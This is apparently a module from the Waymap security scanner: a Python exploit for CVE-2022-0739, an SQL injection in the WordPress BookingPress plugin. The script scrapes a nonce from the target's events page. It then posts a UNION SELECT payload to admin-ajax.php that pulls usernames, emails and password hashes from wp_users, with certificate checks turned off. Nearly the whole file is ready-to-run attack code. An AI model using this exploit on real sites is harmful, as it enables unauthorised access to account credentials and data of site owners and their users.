# Copyright (c) 2024 Waymap developers
# See the file 'LICENSE' for copying permission.
# CVE-2022-0739 - WordPress BookingPress Plugin SQL Injection

import requests
import re
import json
from colorama import init, Fore, Style

init(autoreset=True)

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def extract_data(response_body):

    try:
        users = json.loads(response_body)
        print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Extracting user data from the response...")

        for user in users:
            print(f"{Style.BRIGHT}{Fore.CYAN}Service ID: {user['bookingpress_service_id']}")
            print(f"{Style.BRIGHT}{Fore.CYAN}Category ID: {user['bookingpress_category_id']}")
            print(f"{Style.BRIGHT}{Fore.CYAN}Service Name: {user['bookingpress_service_name']}")
            print(f"{Style.BRIGHT}{Fore.CYAN}Service Price: {user['bookingpress_service_price']}\n")
    except Exception as e:
        print(f"{Style.BRIGHT}{Fore.RED}[•] Error parsing response: {e}")

def exploit(target):

    print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Performing the SQL injection exploit on {target}...")

    action = "bookingpress_front_get_category_services"
    wp_nonce = get_nonce(target)
    category_id = "33"
    total_service = "-7502"
    sqli = ") UNION ALL SELECT user_login,user_email,user_pass,NULL,NULL,NULL,NULL,NULL,NULL from wp_users-- -"

    payload = {
        "action": action,
        "_wpnonce": wp_nonce,
        "category_id": category_id,
        "total_service": total_service + sqli
    }

    try:
        response = requests.post(f'{target}/wp-admin/admin-ajax.php', data=payload, headers={"User-Agent": "Mozilla/5.0"}, verify=False, timeout=30)
        print(f"{Style.BRIGHT}{Fore.GREEN}[•] Exploit sent successfully!")

        return response.text
    except Exception as e:
        print(f"{Style.BRIGHT}{Fore.RED}[•] Error sending exploit request: {e}")
        return None

def get_nonce(target):

    print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Retrieving '_wpnonce' token from {target}...")

    try:
        response = requests.get(f'{target}/events/', headers={"User-Agent": "Mozilla/5.0"}, verify=False, timeout=30)
        response_body = response.text

        match = re.search(r"_wpnonce:'(\w+)'", response_body)
        if match:
            wp_nonce_value = match.group(1)
            print(f"{Style.BRIGHT}{Fore.GREEN}[•] '_wpnonce' token retrieved: {wp_nonce_value}")
            return wp_nonce_value
        else:
            print(f"{Style.BRIGHT}{Fore.RED}[•] '_wpnonce' not found in the page.")
            return None
    except Exception as e:
        print(f"{Style.BRIGHT}{Fore.RED}[•] Error retrieving '_wpnonce': {e}")
        return None

def scan_cve_2022_0739(target):

    response_body = exploit(target)
    if response_body:
        extract_data(response_body)
    else:
        print(f"{Style.BRIGHT}{Fore.RED}[•] Exploit failed. No response received.")